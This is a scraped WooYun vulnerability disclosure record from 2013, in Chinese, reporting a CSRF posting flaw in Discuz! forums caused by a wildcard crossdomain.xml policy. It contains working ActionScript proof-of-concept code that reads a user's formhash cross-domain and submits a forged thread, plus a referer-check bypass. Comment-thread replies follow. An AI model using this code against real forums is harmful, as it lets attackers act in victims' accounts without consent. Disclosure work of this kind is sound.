{"id": 9107, "wybug_id": "wooyun-2013-038429", "wybug_title": "Discuz!配置不当可导致CSRF发帖", "wybug_corp": "Discuz!", "wybug_author": "p.z", "wybug_date": "2013-09-28 14:01", "wybug_open_date": "2013-10-08 14:02", "wybug_type": "应用配置错误", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Discuz!配置不当可导致CSRF发帖 详细说明：  这个漏洞中评论说的 WooYun: Discuz!全版本鸡肋CSRF漏洞一枚 ，由于crossdomain.xml配置不当，可能会导致一些问题。评论时只是有个基本的印象，没有实测，既然xsser说有对这个的防御，那来看看是怎么防的.crossdomain.xml的默认设置：\n<?xml version=\"1.0\"?><cross-domain-policy>  <allow-access-from domain=\"*\" /></cross-domain-policy>\n对dz的代码结构不熟，按黑盒来测。首先是读取那个formhash，看来有了crossdomain.xml的帮助，很容易的读到了当前用户的formhash。\n\n\nfunction gethash() {    function getformhash(txt) {        txt = txt.split('action=logout&amp;formhash=')[1].split('\"')[0];        return txt;    }    var result_lv:LoadVars = new LoadVars();    result_lv.onData = function(txt) {        if (txt) {            txt = getformhash(txt);        } else {            txt = \"Error connecting to server.\";        }        trace(txt);    };    var send_lv:LoadVars = new LoadVars();    method = 'GET';    url = \"http://localhost:8080/\";    send_lv.sendAndLoad(url,result_lv,method);}gethash()\n然后是CSRF发帖，先构造个表单，提交，发现有对refer进行检查。\n\n哦？那截包试试空refer，发现成功了\n\n那就瞎了，https到http的请求是不带refer,可以通过这办法绕过，估计用https架设论坛的没有几个吧，基本全是http的。\nfunction dopost() {    var result_lv:LoadVars = new LoadVars();    result_lv.onData = function(txt) {        trace(txt);    };    var send_lv:LoadVars = new LoadVars();    method = 'post';    url = \"http://localhost:8080/forum.php?mod=post&action=newthread&fid=2&extra=&topicsubmit=yes\";    send_lv['formhash']='{{ form_hash }}'    send_lv['posttime']='1380343694'    send_lv['wysiwyg']='1'    send_lv['subject']='111'    send_lv['message']='123123213213131313'    send_lv['price']=''    send_lv['allownoticeauthor']='1'    send_lv['addfeed']='1'    send_lv['save']=''    send_lv['connect_publish_t']='0'    send_lv.sendAndLoad(url,result_lv,method);}dopost()\n   漏洞证明：  李菊福,不信？您找个https试试。   修复方案：  你们做个调查，到底那个crossdomain.xml有没有用，没用就撤了吧。   版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-10-08 14:02 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-28 14:04 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 14:11 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 14:16 |    \t\tMysterious-M \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        )\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 14:26 |    \t\tAnonymous \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:30        | 园长是大傻逼)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 14:38 |    \t\tp.z  \t\t\t( 普通白帽子  |\t\t\t        Rank:411 漏洞数:40        )\t\t \n  ╮(╯▽╰)╭    \n     2013-09-28 15:03 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 15:31 |    \t\tXpunk \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | Music life)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 16:01 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  楼上全是自动发帖的,好牛B 0.0    \n     2013-09-28 17:19 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:51        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 19:26 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  发帖算啥啊 来把我密码改了啊     \n     2013-09-28 19:34 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 20:10 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-28 22:06 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  楼上的别发了，我的密码就被改了，hacker by：p.z  此号被射， WB已转    \n     2013-09-28 23:40 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  记得貌似有token啊，难道是通用的。。    \n     2013-09-29 08:34 |    \t\tLeon \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 永无宁日啊)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-29 11:35 |    \t\tiiiiiiiii \t\t\t( 普通白帽子  |\t\t\t        Rank:680 漏洞数:89        | )\t\t \n  楼上的别发了，我的密码就被改了，hacker by：p.z 此号被射， WB已转    \n     2013-09-29 19:08 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-09-30 21:09 |    \t\t正好五个字 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:15        )\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-10-01 17:11 |    \t\tCoxxs \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 节操数:233 | ww)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-10-01 18:57 |    \t\t乱人心xsser \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 渗透师|结界师|跨站师|安全工程师|系统工程...)\t\t \n  发帖算啥啊 来把我密码改了啊    \n     2013-10-03 05:06 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  楼上的别发了，我的密码就被改了，hacked by：p.z 此号白射了，一个钢镚都没有！    \n     2013-10-08 14:56 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  楼上的别发了，我的密码就被改了，hacker by：p.z 此号被射， WB已转     \n     2013-10-08 16:30 |    \t\tKi11 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | ส็็็็็็็็็็็็็็็็็็็...)\t\t \n  楼上的别发了，我的密码就被改了，hacker by：p.z 此号被射， WB已转    \n     2013-10-08 17:04 |    \t\tjeary \t\t\t( 普通白帽子  |\t\t\t        Rank:296 漏洞数:106        | (:‮.kcaH eb nac gnihtynA))\t\t \n  楼上的别发了，我的密码就被改了，hacker by：p.z 此号被射， WB已转     \n     2013-10-12 13:21 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  楼上的别发了，我的密码就被改了，hacker by：p.z 此号被射， WB已转    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}